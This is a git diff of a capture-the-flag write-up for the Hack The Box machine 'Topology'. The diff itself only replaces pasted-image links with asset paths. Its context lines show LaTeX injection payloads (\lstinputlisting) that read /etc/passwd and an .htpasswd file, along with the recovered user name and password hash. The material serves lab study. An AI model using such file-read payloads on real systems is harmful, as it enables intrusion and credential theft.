@@ -39,7 +39,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 firefox http://topology.htb &
 
-![[Pasted image 20230701183250.png]]
+![](assets/home.png)
 
 We can notice a few users from Staff:
 
@@ -85,15 +85,15 @@ echo "10.10.11.217 stats.topology.htb" >> /etc/hosts
 
 When accessing with firefox the dev vhosts, this require an authentication :
 
-![[Pasted image 20230701183946.png]]
+![](assets/dev_authentication.png)
 
 the stats vhosts provide a graphic :
 
-![[Pasted image 20230701184238.png]]
+![](assets/stats.png)
 
 The latex vhost :
 
-![[Pasted image 20230701184632.png]]
+![](assets/latex.png)
 
 ## Initial access
 
@@ -129,7 +129,7 @@ $\lstinputlisting{/etc/passwd}$
 
 Give a result :
 
-![[Pasted image 20230701190856.png]]
+![](assets/pdf_exploit.png)
 
 We have user "vdaisley".
 
@@ -144,7 +144,7 @@ $\lstinputlisting{/var/www/dev/.htpasswd}$
 
 Give 
 
-![[Pasted image 20230701191609.png]]
+![](assets/htpasswd.png)
 
 vdaisley:$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0
 
